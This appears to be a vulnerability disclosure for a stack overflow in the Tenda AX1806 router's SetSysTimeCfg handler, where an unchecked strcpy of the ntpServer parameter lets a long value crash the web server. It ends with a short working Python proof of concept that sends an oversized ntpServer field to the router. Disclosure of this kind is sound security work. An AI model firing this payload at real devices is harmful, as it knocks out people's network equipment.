Affect device: Tenda Router AX1806 v1.0.0.1(https://www.tenda.com.cn/download/detail-3306.html)

Vulnerability Type: Stack overflow

Impact: Denial of Service(DoS)

# Vulnerability description

This vulnerability lies in the `/goform/SetSysTimeCfg` page which influences the lastest version of Tenda Router AX1806 v1.0.0.1: https://www.tenda.com.cn/download/detail-3306.html



There is a stack overflow vulnerability in the `fromSetSysTime` function.

The `v4` variable is obtained directly from the http request parameter `ntpServer`.

This function uses strcpy to copy the **variable v4 to the stack variable &v33[16]** without any sercuity check.

Attacker can construct **a long ntpServer parameter** in the http request,which causes stack overflow.

![image-20220208184212635](image/1.png)

So attacker can perform **denial of service attacks by causing tdhttpd to crash.**

# POC

Poc to crash：



```python
import requests

url = "https://192.168.2.1/goform/SetSysTimeCfg"

ntpserver = b"a"*0x10000
timeType = "sync"
r = requests.post(url, data={"timeType" : timeType ,"ntpServer" : ntpserver},verify=False)
print(r.content)
```

